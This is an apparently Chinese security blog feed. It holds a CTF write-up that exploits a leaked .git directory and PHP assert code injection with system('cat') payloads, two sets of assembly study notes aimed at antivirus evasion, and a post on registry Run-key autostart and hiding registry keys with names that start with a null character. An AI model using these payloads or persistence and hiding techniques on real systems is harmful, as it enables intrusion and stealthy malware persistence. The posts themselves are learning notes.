<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102092755185.png" alt="image-20220102092755185"></p>
<p>点进去在about页面发现git关键词，访问.git目录</p>
<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102092836849.png" alt="image-20220102092836849"></p>
<p>存在泄露</p>
<p>用githack把源码下载下来</p>
<p>下载下来后发现一个flag.php</p>
<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102093430458.png" alt="image-20220102093430458"></p>
<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102093531927.png" alt="image-20220102093531927"></p>
<p>再看看其他的php</p>
<p>在index.php中有这样一段php</p>
<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102093735231.png" alt="image-20220102093735231"></p>
<p>asserter()函数可以吧字符串当成php执行，这page又没有过滤，然后就想到用system来读取flag</p>
<p>先试一下吧strpos给注释掉</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?page=%27).phpinfo();//</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102100454145.png" alt="image-20220102100454145"></p>
<p>芜湖！</p>
<p>最后用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?page=&#x27;).system(cat templates/flag.php);//</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102100753784.png" alt="image-20220102100753784"></p>
<p>要打开源码才看得见</p>
<p><img src="/2022/01/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw-git%E6%B3%84%E9%9C%B2/image-20220102102441825.png" alt="image-20220102102441825"></p>
<p>然后又看到了另一种方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:?page=abc&#x27;) or system(&quot;cat templates/flag.php&quot;);//</span><br></pre></td></tr></table></figure>

<p>$file =templates/ abc’) or system(“cat templates/flag.php”);// “.php”<br> 因为在strpos中只传入了abc，所以其肯定返回false，在利用or让其执行system函数，再用” // “将后面的语句注释掉</p>
<p><a href="https://www.cnblogs.com/xhds/p/12255609.html">PHP代码执行漏洞 - 笑花大王 - 博客园 (cnblogs.com)</a></p>
<p>其他泄露：<br>.svn源码泄露：当可以访问到/.svn/entries的时候，就证明存在。<br>DS_Store 文件泄露：当访问/.ds_store可以访问的到，就证明存在。<br>.hg 源码泄露：当访问/.hg存在的时候，就证明存在该漏洞。<br>常见编辑器备份文件泄露：<br>http://[ip]/.test.php.swp<br>http://[ip]/test.php.bak<br>http://[ip]/test.jsp.old<br>http://[ip]/cgi~<br>http://[ip]/index.php~</p>
<p>or用法补充</p>
<p>经常看到这样的语句：<br>file=fopen(file=fopen(filename, ‘r’) or die(“抱歉，无法打开: filename”);or在这里是这样理解的，因为在PHP中并不区分数据类型，所以filename”);or在这里是这样理解的，因为在PHP中并不区分数据类型，所以file既可以是int也可以bool，所以这样的语句不会报错。但其处理过程可能有些朋友不大明白。<br>其实在大多数的语言中， bool or bool这样的语句中，如果前一个值为真后一个值就不会再判断了。这里也是的，所以如果fopen函数执行正确的话，会返回一个大于0的int值（这其实就是“真”），后面的语句就不会执行了。如果fopen函数执行失败，就会返回false，那么就会判断后面的表达式是否为真了。<br>结果执行了die()之后，不管返回什么，程序都已经停止执行了，并且显示指定的出错信息，也就达到了调试的目的。<br>就这样。</p>
]]></content>
      <categories>
        <category>-Experience</category>
      </categories>
  </entry>
  <entry>
    <title>汇编1-进制、数据宽度、通用寄存器、汇编指令、内存寻址</title>
    <url>/2023/12/28/%E6%B1%87%E7%BC%961-%E8%BF%9B%E5%88%B6%E3%80%81%E6%95%B0%E6%8D%AE%E5%AE%BD%E5%BA%A6%E3%80%81%E9%80%9A%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8%E3%80%81%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E3%80%81%E5%86%85%E5%AD%98%E5%AF%BB%E5%9D%80/</url>
    <content><![CDATA[<h1 id="汇编1-进制、数据宽度、通用寄存器、汇编指令、内存寻址"><a href="#汇编1-进制、数据宽度、通用寄存器、汇编指令、内存寻址" class="headerlink" title="汇编1-进制、数据宽度、通用寄存器、汇编指令、内存寻址"></a>汇编1-进制、数据宽度、通用寄存器、汇编指令、内存寻址</h1><p>系统学习一下免杀，纯属个人笔记。禁止搬运。课是别人的，要删联系我即可。刚考完就火急火燎的来学免杀了，感觉还是网安好啊，正反馈十足，考研这b东西，真恼火。唉，也不知道考得上不这次。</p>
<p>首先记录一些杂七杂八的东西</p>
<h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="位数的知识扩展"><a href="#位数的知识扩展" class="headerlink" title="位数的知识扩展"></a>位数的知识扩展</h2><p>比如一个计算机的位数是4，那他的数据宽度就只能存0000-1111（二进制）这么多。也就是0-15</p>
<p>那么以此类推，32位的系统的数据宽度也能算出来。</p>
<h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><p><img src="/2023/12/28/%E6%B1%87%E7%BC%961-%E8%BF%9B%E5%88%B6%E3%80%81%E6%95%B0%E6%8D%AE%E5%AE%BD%E5%BA%A6%E3%80%81%E9%80%9A%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8%E3%80%81%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E3%80%81%E5%86%85%E5%AD%98%E5%AF%BB%E5%9D%80/image-20231227223714089.png" alt="image-20231227223714089"></p>
<p>哎哟有水印，我这个知识个人笔记哈，这一篇的内容反正百度也能拿到的。</p>
<h2 id="vs的一些基础小用"><a href="#vs的一些基础小用" class="headerlink" title="vs的一些基础小用"></a>vs的一些基础小用</h2><p>比如说你要看c语言的代码的反汇编，先下个断点，然后直接运行，右键进入反汇编即可</p>
<p><img src="/2023/12/28/%E6%B1%87%E7%BC%961-%E8%BF%9B%E5%88%B6%E3%80%81%E6%95%B0%E6%8D%AE%E5%AE%BD%E5%BA%A6%E3%80%81%E9%80%9A%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8%E3%80%81%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E3%80%81%E5%86%85%E5%AD%98%E5%AF%BB%E5%9D%80/image-20230915201659763.png" alt="image-20230915201659763"></p>
<p><img src="/2023/12/28/%E6%B1%87%E7%BC%961-%E8%BF%9B%E5%88%B6%E3%80%81%E6%95%B0%E6%8D%AE%E5%AE%BD%E5%BA%A6%E3%80%81%E9%80%9A%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8%E3%80%81%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E3%80%81%E5%86%85%E5%AD%98%E5%AF%BB%E5%9D%80/image-20230915201843667.png" alt="image-20230915201843667"></p>
<h2 id="od"><a href="#od" class="headerlink" title="od"></a>od</h2><p>单步走是按f8</p>
<p>od中，改变的寄存器或者说是数据，会变成红色</p>
<h1 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h1><h2 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h2><p>mov  把后面的参数覆盖掉前面指定的寄存器中去（前后的寄存器的数据宽度必须是一样的，而如果后面的参数是数据的话，那么只会取后8位的数据放到前面的寄存器中去）</p>
<p><img src="/2023/12/28/%E6%B1%87%E7%BC%961-%E8%BF%9B%E5%88%B6%E3%80%81%E6%95%B0%E6%8D%AE%E5%AE%BD%E5%BA%A6%E3%80%81%E9%80%9A%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8%E3%80%81%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E3%80%81%E5%86%85%E5%AD%98%E5%AF%BB%E5%9D%80/image-20230915203822481.png" alt="image-20230915203822481"></p>
<p><img src="/2023/12/28/%E6%B1%87%E7%BC%961-%E8%BF%9B%E5%88%B6%E3%80%81%E6%95%B0%E6%8D%AE%E5%AE%BD%E5%BA%A6%E3%80%81%E9%80%9A%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8%E3%80%81%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E3%80%81%E5%86%85%E5%AD%98%E5%AF%BB%E5%9D%80/image-20231227224752974.png" alt="image-20231227224752974"></p>
<h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><p>两个参数，参数相加之后，放到第一个参数的寄存器里面去，这里的寄存器记得也要保持位数相同。</p>
<p><img src="/2023/12/28/%E6%B1%87%E7%BC%961-%E8%BF%9B%E5%88%B6%E3%80%81%E6%95%B0%E6%8D%AE%E5%AE%BD%E5%BA%A6%E3%80%81%E9%80%9A%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8%E3%80%81%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E3%80%81%E5%86%85%E5%AD%98%E5%AF%BB%E5%9D%80/image-20231227230452727.png" alt="image-20231227230452727"></p>
<h2 id="sub"><a href="#sub" class="headerlink" title="sub"></a>sub</h2><p>这就是相减了</p>
<p><img src="/2023/12/28/%E6%B1%87%E7%BC%961-%E8%BF%9B%E5%88%B6%E3%80%81%E6%95%B0%E6%8D%AE%E5%AE%BD%E5%BA%A6%E3%80%81%E9%80%9A%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8%E3%80%81%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E3%80%81%E5%86%85%E5%AD%98%E5%AF%BB%E5%9D%80/image-20231227230512866.png" alt="image-20231227230512866"></p>
<h2 id="and"><a href="#and" class="headerlink" title="and"></a>and</h2><p>这个就是位运算了，会对每一位都进行运算，</p>
<p><img src="/2023/12/28/%E6%B1%87%E7%BC%961-%E8%BF%9B%E5%88%B6%E3%80%81%E6%95%B0%E6%8D%AE%E5%AE%BD%E5%BA%A6%E3%80%81%E9%80%9A%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8%E3%80%81%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E3%80%81%E5%86%85%E5%AD%98%E5%AF%BB%E5%9D%80/image-20231227231146757.png" alt="image-20231227231146757"></p>
<p>就像这样，有0则全为0，全是1则是1.</p>
<p><img src="/2023/12/28/%E6%B1%87%E7%BC%961-%E8%BF%9B%E5%88%B6%E3%80%81%E6%95%B0%E6%8D%AE%E5%AE%BD%E5%BA%A6%E3%80%81%E9%80%9A%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8%E3%80%81%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E3%80%81%E5%86%85%E5%AD%98%E5%AF%BB%E5%9D%80/image-20231227231228499.png" alt="image-20231227231228499"></p>
<p>这里值得注意的是，od里面的数都是十六进制的哈，而位运算都是基于二进制算的。举个栗子，0x6和0x9进行运算，那就是0110和1001进行运算，那结果就是0.</p>
<h2 id="or"><a href="#or" class="headerlink" title="or"></a>or</h2><p>同and，只不过是或的关系。</p>
<h2 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h2><p>那异或呢</p>
<p>如果a、b两个值不相同，则异或结果为1。如果a、b两个值相同，异或结果为0。</p>
<h2 id="not"><a href="#not" class="headerlink" title="not"></a>not</h2><p>就是取非，1变成0，0变成1。</p>
<h1 id="内存寻址"><a href="#内存寻址" class="headerlink" title="内存寻址"></a>内存寻址</h1><h2 id="基础指令-取（改）内存里面的值"><a href="#基础指令-取（改）内存里面的值" class="headerlink" title="基础指令-取（改）内存里面的值"></a>基础指令-取（改）内存里面的值</h2><p>嘿嘿我的网安，我爱网安。</p>
<p>寄存器是存在于cpu里面的，所以运算速度相比内存来说，就很快。但是cpu的空间不够，</p>
<p><img src="/2023/12/28/%E6%B1%87%E7%BC%961-%E8%BF%9B%E5%88%B6%E3%80%81%E6%95%B0%E6%8D%AE%E5%AE%BD%E5%BA%A6%E3%80%81%E9%80%9A%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8%E3%80%81%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E3%80%81%E5%86%85%E5%AD%98%E5%AF%BB%E5%9D%80/image-20231227233542844.png" alt="image-20231227233542844"></p>
<p>这里值得注意点的是，ESP EBP这两个是存储内存地址的(和堆栈有关)，而EAX ECX EDX EBX这四个基本上使用来存储十六进制数据的。acdb，数据的存储数据基本是按照这个顺序存入的。</p>
<p>byte是1字节，8bit。<br>word是1字，16bit<br>dword 双字，32bit<br>qword 64bit</p>
<p>在计算机里面每个字节都有一个编号，这里可以认为内存的编号就是字节，在32位下范围为00000000-FFFFFFFF，最大的殉职范围就是FFFFFFFF+1字节，转换过来就是4G</p>
<p><img src="/2023/12/28/%E6%B1%87%E7%BC%961-%E8%BF%9B%E5%88%B6%E3%80%81%E6%95%B0%E6%8D%AE%E5%AE%BD%E5%BA%A6%E3%80%81%E9%80%9A%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8%E3%80%81%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E3%80%81%E5%86%85%E5%AD%98%E5%AF%BB%E5%9D%80/image-20231227234612416.png" alt="image-20231227234612416"></p>
<p>这时候咱们就举个栗子比如说，我们要将一个8位的通用寄存器里面的内容放到一个8位的内存中去<code>mov m8 r8</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov byte ptr ds:[0x19FF74],al</span><br><span class="line">mov dword ptr ds:[0x19FF74],eax</span><br></pre></td></tr></table></figure>

<p>其中，byte和dword是单位嘛，就是指几位。<br>而ptr是一个关键字，表示指针，表示后面这个ds:[0x19FF74]是个指针<br>而ds:[0x19FF74]则是一个内存地址ds    是data segment register，即数据段寄存器。<br>这里值得注意的是，中括号括起来的东西是一个内存地址，而不是立即数。</p>
<h2 id="lea"><a href="#lea" class="headerlink" title="lea"></a>lea</h2><p>这个指令是寻找内存地址的意思，<code>lea eax,dword ptr ds:[ecx]</code>是取ecx的地址（和c语言的指针差不多）</p>
<h2 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h2><p><img src="/2023/12/28/%E6%B1%87%E7%BC%961-%E8%BF%9B%E5%88%B6%E3%80%81%E6%95%B0%E6%8D%AE%E5%AE%BD%E5%BA%A6%E3%80%81%E9%80%9A%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8%E3%80%81%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E3%80%81%E5%86%85%E5%AD%98%E5%AF%BB%E5%9D%80/image-20231228002134442.png" alt="image-20231228002134442"></p>
<p>第一行，把后面的立即数存到ecx寄存器中<br>第二行，把ecx存的立即数作为地址，将这个地址中的内容存到eax里面去。<br>第三行，把立即数存到edx寄存器中<br>第四行，把后面的立即数存到edx存的地址所指向的内存中去<br>第五行，表示取edx存的地址，存到eax寄存器中去<br>第六行，表示讲edx寄存器所指向的内存中存的东西，存到eax中区</p>
<p>（课里面有个好厉害的师傅，感觉什么都能想到，举一反三，我感觉啥也不懂一样像个呆瓜捏。）慢慢学把，加油捏。</p>
]]></content>
      <categories>
        <category>-miansha</category>
      </categories>
  </entry>
  <entry>
    <title>汇编2-标志寄存器、jcc语句、堆栈、堆栈图</title>
    <url>/2023/12/29/%E6%B1%87%E7%BC%962-%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8%E3%80%81jcc%E8%AF%AD%E5%8F%A5%E3%80%81%E5%A0%86%E6%A0%88%E3%80%81%E5%A0%86%E6%A0%88%E5%9B%BE/</url>
    <content><![CDATA[<h1 id="汇编2-标志寄存器、jcc语句、堆栈、堆栈图"><a href="#汇编2-标志寄存器、jcc语句、堆栈、堆栈图" class="headerlink" title="汇编2-标志寄存器、jcc语句、堆栈、堆栈图"></a>汇编2-标志寄存器、jcc语句、堆栈、堆栈图</h1><h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><p>EIP寄存器是记录程序运行到哪个寄存器就指向哪个寄存器。</p>
<p>cmp语句是用来看前后两个参数的值是否相等的，当然可以指定某个内存中的数据进行比较。比较结果会放到Zf里面去，也就是下图所示的寄存器中。</p>
<p><img src="/2023/12/29/%E6%B1%87%E7%BC%962-%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8%E3%80%81jcc%E8%AF%AD%E5%8F%A5%E3%80%81%E5%A0%86%E6%A0%88%E3%80%81%E5%A0%86%E6%A0%88%E5%9B%BE/image-20231228225203726.png" alt="image-20231228225203726"></p>
<p>0XCCCCCCCC 在汇编中是int 3</p>
<h2 id="od"><a href="#od" class="headerlink" title="od"></a>od</h2><p>F2  在OD的反汇编视图中使用F2进行下断<br> F4  程序执行到当前光标位置<br> F5  缩小、还原当前窗口<br> F7  单步步入，进入函数内,跟进到CALL地址处<br> F8  单步步过，越过函数实现，不会进入CALL地址处<br> F9  直接运行程序，遇到断点程序暂停</p>
<h1 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h1><p><img src="/2023/12/29/%E6%B1%87%E7%BC%962-%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8%E3%80%81jcc%E8%AF%AD%E5%8F%A5%E3%80%81%E5%A0%86%E6%A0%88%E3%80%81%E5%A0%86%E6%A0%88%E5%9B%BE/image-20231228225350448.png" alt="image-20231228225350448"></p>
<p><img src="/2023/12/29/%E6%B1%87%E7%BC%962-%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8%E3%80%81jcc%E8%AF%AD%E5%8F%A5%E3%80%81%E5%A0%86%E6%A0%88%E3%80%81%E5%A0%86%E6%A0%88%E5%9B%BE/image-20231228225609644.png" alt="image-20231228225609644"></p>
<p>下面这张图是eflag寄存器需要我们掌握的位数，一般都有八个，下面是一些介绍。</p>
<p><img src="/2023/12/29/%E6%B1%87%E7%BC%962-%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8%E3%80%81jcc%E8%AF%AD%E5%8F%A5%E3%80%81%E5%A0%86%E6%A0%88%E3%80%81%E5%A0%86%E6%A0%88%E5%9B%BE/image-20231228225849576.png" alt="image-20231228225849576"></p>
<p><img src="/2023/12/29/%E6%B1%87%E7%BC%962-%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8%E3%80%81jcc%E8%AF%AD%E5%8F%A5%E3%80%81%E5%A0%86%E6%A0%88%E3%80%81%E5%A0%86%E6%A0%88%E5%9B%BE/image-20231228230924204.png" alt="image-20231228230924204"></p>
<h1 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h1><p><img src="/2023/12/29/%E6%B1%87%E7%BC%962-%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8%E3%80%81jcc%E8%AF%AD%E5%8F%A5%E3%80%81%E5%A0%86%E6%A0%88%E3%80%81%E5%A0%86%E6%A0%88%E5%9B%BE/image-20231228231149048.png" alt="image-20231228231149048">哈</p>
<p>上图，一个exe程序可以分为这几个区域，<br>其中代码区就是存储一些代码，他是可读可可执行（rx）权限<br>堆，这个里面就是c语言里面的malloc函数申请的内存空间就是申请在这里面的。</p>
<h2 id="ESP-EBP"><a href="#ESP-EBP" class="headerlink" title="ESP EBP"></a>ESP EBP</h2><p>esp和ebp分别是栈顶和栈底，值得注意的是，这个堆栈是从高字节往第四节存储的。</p>
<p>在进入程序和退出程序的时候，esp和ebp的值是不能变的，也就是堆栈平衡。</p>
<h1 id="jcc语句"><a href="#jcc语句" class="headerlink" title="jcc语句"></a>jcc语句</h1><p>jmp，跳转到指定地址 硬编码：e9<br>jmp是不会引起esp和ebp的变化的。（其本质就是修改EIP，但是你自己直接mov eip是不行的）</p>
<p>call，跳转到指定地址并返回到当前指令的下一行（调用函数之后回来），硬编码 e8<br>call是会涉及到堆栈的变化的，esp提升4字节，将返回地址压入堆栈。<br>值得注意的是，由于esp和ebp是从高字节往低字节存储的，所以提升4也就是减4.</p>
<p>ret，返回到指定地址（和retn是一个东西）<br>ret会esp会降低4字节，并且会从堆栈中提出返回地址传给eip</p>
<p>cmp指令，比较两 个操作数是否相等，如果相等则ZF为1（但是不能比较两个立即数）</p>
<p>test指令，对两个操作数进行相与操作，通常都是用于判断一个寄存器是否为0，test eax eax</p>
<p>而jcc语句大多都是通过不同的情况，进行跳转</p>
<p><img src="/2023/12/29/%E6%B1%87%E7%BC%962-%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8%E3%80%81jcc%E8%AF%AD%E5%8F%A5%E3%80%81%E5%A0%86%E6%A0%88%E3%80%81%E5%A0%86%E6%A0%88%E5%9B%BE/image-20231229151423853.png" alt="image-20231229151423853"></p>
<h1 id="堆栈-1"><a href="#堆栈-1" class="headerlink" title="堆栈"></a>堆栈</h1><h2 id="压入数据"><a href="#压入数据" class="headerlink" title="压入数据"></a>压入数据</h2><p>压入数据一般就可以大致分为下面两个</p>
<p>1.先把数据存到堆栈-4的那个地址，随后将堆栈提升4字节，从而存入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">代码实现如下：</span><br><span class="line">mov dword ptr ds:[0x19FF70],0x123456</span><br><span class="line">sub esp,0x4</span><br></pre></td></tr></table></figure>



<p>2.也可以先提栈再存入。</p>
<h2 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h2><p>可以直接从栈顶和栈底来读取数据，esp和ebp</p>
<h2 id="移除数据"><a href="#移除数据" class="headerlink" title="移除数据"></a>移除数据</h2><p>和压入数据差不多，可以先压栈再去除数据，或者先取出数据之后在压栈。</p>
<p>当然上述指令都不常用，我们一般用push和pop，只不过讲解上面的内容是方便理解原理。</p>
<h2 id="push"><a href="#push" class="headerlink" title="push"></a>push</h2><p>向堆栈中存入数据，只有一个参数，那个参数就是数据。</p>
<h2 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h2><p>压栈之后将数据存入寄存器中，只有一个参数，那个参数就是寄存器。</p>
<h1 id="堆栈图"><a href="#堆栈图" class="headerlink" title="堆栈图"></a>堆栈图</h1><p>stos指令，循环执行将eax的值存储到[edi]指定的内存，执行ecx中存储的次数，每执行一次ecx的值减1。</p>
<p>保留环境：esp ebp在进入函数的时候是什么样，出来的时候就是什么样子。</p>
]]></content>
      <categories>
        <category>-miansha</category>
      </categories>
  </entry>
  <entry>
    <title>注册表自启动基础</title>
    <url>/2023/01/06/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="注册表自启动基础"><a href="#注册表自启动基础" class="headerlink" title="注册表自启动基础"></a>注册表自启动基础</h1><p>修改注册表实现开机子启动的方法的好处在于，全版本的windows系统都适用。</p>
<p>而修改注册表的方法有两种，gui界面和命令行。</p>
<h1 id="修改注册表的两种方法"><a href="#修改注册表的两种方法" class="headerlink" title="修改注册表的两种方法"></a>修改注册表的两种方法</h1><h2 id="手动修改注册表"><a href="#手动修改注册表" class="headerlink" title="手动修改注册表"></a>手动修改注册表</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">首先regedit调用注册表。</span><br><span class="line"></span><br><span class="line">打开注册表之后，找到如下位置HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line"></span><br><span class="line">以桌面上的1.exe文件为例，在run右侧新建一个字符串值，名字任取，我这里设置为aaa。首先查看1.exe文件的路径：</span><br><span class="line">C:\Users\ASUS\Desktop\1.exe</span><br><span class="line"></span><br><span class="line">然后双击aaa并修改它的值为：</span><br><span class="line">&quot;C:\Users\ASUS\Desktop\1.exe&quot; /start</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/06/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%9F%BA%E7%A1%80/image-20230106160655173.png" alt="image-20230106160655173"></p>
<p>(图片虽然是txt，但是是一样的效果)</p>
<p><img src="/2023/01/06/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%9F%BA%E7%A1%80/image-20230106160722409.png" alt="image-20230106160722409"></p>
<h2 id="命令行修改注册表"><a href="#命令行修改注册表" class="headerlink" title="命令行修改注册表"></a>命令行修改注册表</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过命令行修改注册表的主要方法为用reg命令来改。</span><br><span class="line">可以在命令行输入以下命令查看帮助：</span><br><span class="line">reg /?</span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/06/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%9F%BA%E7%A1%80/image-20230106161009102.png" alt="image-20230106161009102"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我们需要用到的一个参数是：</span><br><span class="line">reg add</span><br><span class="line">这表示增加或修改。没有的就增加，已有的就覆盖（名称及类型）。该命令的语法及参数的含义可以在命令行中输入：</span><br></pre></td></tr></table></figure>

<p><code>reg add /?</code></p>
<p><img src="/2023/01/06/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%9F%BA%E7%A1%80/image-20230106161228642.png" alt="image-20230106161228642"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这里我们需要注意的地方有两个，首先，路径是要被双引号包起来的，其次，双引号后面有一个空格，空格后面才是/`start`参数。</span><br><span class="line">构造语句如下：</span><br><span class="line"></span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v bbb /t REG_SZ /d &quot;\&quot;C:\Users\ASUS\Desktop\1.exe\&quot; /start&quot; /f</span><br><span class="line"></span><br><span class="line">注意，/d参数后面的双引号内的全部内容是表示要写入bbb键的内容，而由于该参数会识别双引号，因此这里用了转义。同时，空格也是被包含在双引号内的，因此不必再单独处理。</span><br><span class="line">注意修改注册表最好以管理员身份运行命令提示符，以免出现权限不够的情况。</span><br></pre></td></tr></table></figure>

<h2 id="查询注册表键值"><a href="#查询注册表键值" class="headerlink" title="查询注册表键值"></a>查询注册表键值</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query</span><br><span class="line">用以上命令即可实现。当然如果不知道语法可以通过以下命令进行查询</span><br><span class="line">reg query /?</span><br></pre></td></tr></table></figure>

<p>举个例子，查询刚刚写入的注册表中的键值</p>
<p><code>reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v bbb</code></p>
<h1 id="隐藏注册表的创建"><a href="#隐藏注册表的创建" class="headerlink" title="隐藏注册表的创建"></a>隐藏注册表的创建</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>首先讲讲，隐藏注册表的原理吧。</p>
<p>注册表键值名称经过特殊构造： 以”\0”作为开头，后面加上任意字符(不能为数字)</p>
<p>对于Windows系统，”\0”(即0x0000)会被识别为字符串的结束符，所以在对该字符串读取的过程中，遇到开头的”\0”，会被解析成结束符，提前截断，导致读取错误</p>
<p>而使用Native API设定注册表，需要使用结构体OBJECT_ATTRIBUTES作为参数， 指定读取的字符串长度</p>
<p>只要长度设定正常，就能够读取正确的字符串，避免这个bug</p>
<p>所以，我们可以通过Native API来创建这个特殊的注册表名</p>
<p>更为重要的是，像regedit.exe和其他对注册表的操作，通常会调用Win32 API，这就导致该注册表无法被读取，也就实现了所谓的”隐藏”</p>
<p>综上，创建方法为： 通过Native API创建一个以”\0”开头的键值</p>
<p>[Native API_百度百科 (baidu.com)](<a href="https://baike.baidu.com/item/Native">https://baike.baidu.com/item/Native</a> API/5877113?fr=aladdin)</p>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>实现部分我在网上看都是一些工具的使用，感觉不太行，其中有个工具已经找不到了。然后我问了一下新朋友（chatgpt</p>
<p><img src="/2023/01/06/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%9F%BA%E7%A1%80/image-20230106171650419.png" alt="image-20230106171650419"></p>
<p>算是加深了一些印象。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当然可以！首先，您可以使用本机API——RegCreateKeyEx来创建一个注册表键。该函数需要提供根键的句柄、以“\\0”开头的字符串作为键的名称以及相应的保护属性，例如访问权限等属性，以及用于指定所创建键的方式的标志。然后，您可以调用函数RegSetValueEx来设置键值，此函数需要您提供要设置的键的句柄，其值的名称以及具体的值，以在Windows注册表中隐藏键值。</span><br></pre></td></tr></table></figure>

<p>随后又问了下手工创建</p>
<p><img src="/2023/01/06/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%9F%BA%E7%A1%80/image-20230106192024145.png" alt="image-20230106192024145"></p>
